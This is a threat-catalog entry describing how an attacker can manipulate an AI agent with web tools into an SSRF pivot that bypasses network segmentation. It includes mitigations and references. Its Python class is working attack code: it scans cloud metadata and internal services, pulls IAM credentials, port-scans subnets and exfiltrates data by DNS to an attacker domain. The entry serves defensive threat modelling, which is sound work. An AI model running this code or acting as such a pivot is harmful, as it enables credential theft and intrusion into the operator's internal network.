---
id: "TS-2026-0175"
title: "Network Segmentation Bypass via Agent Pivoting"
category: "P3"
severity: "Critical"
description: "An AI agent with network-accessible tools acts as a pivot point to bypass network segmentation controls. By leveraging the agent's position within a trusted network zone and its ability to make HTTP requests, DNS lookups, or API calls, an attacker reaches internal services that are otherwise isolated from external access."
date: "2026-02-26"
tags: ["network", "segmentation", "pivoting", "lateral-movement", "ssrf", "firewall-bypass", "infrastructure"]
---

## Overview

Network segmentation is a fundamental security control that isolates sensitive systems (databases, internal APIs, admin panels) from untrusted networks. AI agents, however, often sit in privileged network positions—they need access to internal APIs, databases, and cloud services to function. When an agent has tools that make network requests (web browsing, API calls, health checks), it becomes a Server-Side Request Forgery (SSRF) pivot point. An attacker can manipulate the agent to make requests to internal services, effectively bypassing firewalls and network ACLs by routing traffic through the agent's trusted network position.

## Attack Vector

1. Agent is deployed in a trusted network zone with access to internal services
2. Attacker sends the agent a request that triggers network-capable tools
3. The request targets internal IP ranges (10.x, 172.16.x, 192.168.x) or cloud metadata endpoints
4. Agent's tools make the request from within the trusted zone, bypassing firewall rules
5. Response data flows back through the agent to the attacker
6. Attacker iteratively maps and accesses the internal network through the agent

## Technical Details

```python
import requests
import ipaddress
import json
import socket
from concurrent.futures import ThreadPoolExecutor

class AgentNetworkPivot:
    """Demonstrates network segmentation bypass through agent pivoting."""
    
    def __init__(self, agent_request_tool):
        self.make_request = agent_request_tool
    
    def probe_internal_network(self):
        """Use agent's web tool to scan internal network."""
        # These requests come FROM the agent's trusted IP
        internal_targets = [
            # Cloud metadata endpoints
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            
            # Common internal services
            "http://10.0.0.1:8080/admin",
            "http://consul.service.consul:8500/v1/kv/?recurse",
            "http://vault.service.consul:8200/v1/sys/health",
            "http://elasticsearch.internal:9200/_cat/indices",
            "http://grafana.internal:3000/api/dashboards",
            
            # Kubernetes internal
            "https://kubernetes.default.svc/api/v1/namespaces",
            "http://kubelet.internal:10255/pods",
            
            # Cloud provider internal APIs
            "http://169.254.170.2/v2/credentials",  # ECS task metadata
        ]
        
        results = {}
        for target in internal_targets:
            try:
                # Agent makes request from trusted network position
                resp = self.make_request(target, timeout=3)
                results[target] = {
                    "status": resp.status_code,
                    "body_preview": resp.text[:500]
                }
            except Exception as e:
                results[target] = {"error": str(e)}
        
        return results
    
    def exploit_cloud_metadata(self):
        """Access cloud metadata service through agent."""
        # Step 1: Get instance role
        role_resp = self.make_request(
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        )
        role_name = role_resp.text.strip()
        
        # Step 2: Get temporary credentials
        creds_resp = self.make_request(
            f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
        )
        credentials = json.loads(creds_resp.text)
        
        # Attacker now has AWS credentials:
        # AccessKeyId, SecretAccessKey, Token
        return credentials
    
    def port_scan_via_agent(self, target_subnet: str):
        """Use agent's network tools to scan internal ports."""
        network = ipaddress.ip_network(target_subnet)
        common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017]
        
        open_services = []
        
        for host in list(network.hosts())[:256]:
            for port in common_ports:
                try:
                    resp = self.make_request(
                        f"http://{host}:{port}/",
                        timeout=1
                    )
                    open_services.append({
                        "host": str(host),
                        "port": port,
                        "status": resp.status_code,
                        "server": resp.headers.get("Server", "unknown")
                    })
                except requests.ConnectionError:
                    pass  # Port closed or filtered
                except requests.Timeout:
                    open_services.append({
                        "host": str(host),
                        "port": port,
                        "status": "filtered"
                    })
        
        return open_services
    
    def dns_based_data_exfiltration(self, data: str, attacker_domain: str):
        """Exfiltrate data through DNS queries from agent's network."""
        import base64
        
        # Encode data in DNS labels
        encoded = base64.b32encode(data.encode()).decode().lower()
        chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
        
        for i, chunk in enumerate(chunks):
            # Agent resolves DNS - goes through internal DNS resolver
            # Resolver forwards to attacker's authoritative DNS server
            hostname = f"{chunk}.{i}.exfil.{attacker_domain}"
            try:
                socket.gethostbyname(hostname)
            except:
                pass  # DNS resolution "failure" still sends data to attacker's DNS
```

## Impact

- **Network Segmentation Rendered Useless**: Agent bridges trusted and untrusted zones
- **Cloud Credential Theft**: Metadata endpoint access yields IAM credentials
- **Internal Service Discovery**: Attacker maps the entire internal network through the agent
- **Data Exfiltration**: Sensitive data extracted from internal services via the agent tunnel
- **Lateral Movement**: Agent becomes a persistent proxy into the internal network

## Mitigation

1. **Network Egress Filtering**: Restrict agent's outbound connections to an allow-list of required endpoints
2. **Block Metadata Endpoints**: Use IMDSv2 (require PUT token) and firewall rules to block metadata access from agents
3. **URL Validation**: Validate and sanitize all URLs before agent tools make requests; block private IP ranges
4. **DNS Filtering**: Use DNS policies to prevent resolution of suspicious or internal-only domains
5. **Micro-Segmentation**: Place agents in their own network segment with minimal lateral access
6. **Request Proxy**: Route all agent HTTP requests through a security proxy that inspects and filters
7. **SSRF Protection Libraries**: Use libraries that detect and block SSRF patterns (private IPs, cloud metadata)
8. **Zero Trust Architecture**: Require authentication for all internal service access, even from trusted zones

## Real-World Examples

- **Elisity: AI Agents in OT Security — S4x26 Findings (2026)** — Documented how AI agents can autonomously perform reconnaissance on OT networks and adapt lateral movement strategies in real time, pivoting between exploit paths at machine speed before detection triggers. [Read more](https://www.elisity.com/blog/ai-agents-ot-security-s4x26-insights)
- **Elisity: AI Agent Network Security — Microsegmentation (2026)** — Analysis showing compromised AI agents can pivot across network segments at machine speed, outpacing traditional detection mechanisms. [Read more](https://www.elisity.com/blog/ai-agent-network-security-microsegmentation-2026)

No documented specific incident of an AI agent being exploited for network pivoting in production yet. If you know of one, please [submit it](https://github.com/cgyagenticloud/troyskills/issues).

## References

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Capital One Breach - SSRF via Cloud Metadata](https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af)
- [TS-2026-0171](/skill/TS-2026-0171) — Container Runtime Escape via Agent Tool Call
- [TS-2026-0172](/skill/TS-2026-0172) — Cloud IAM Policy Manipulation via Agent
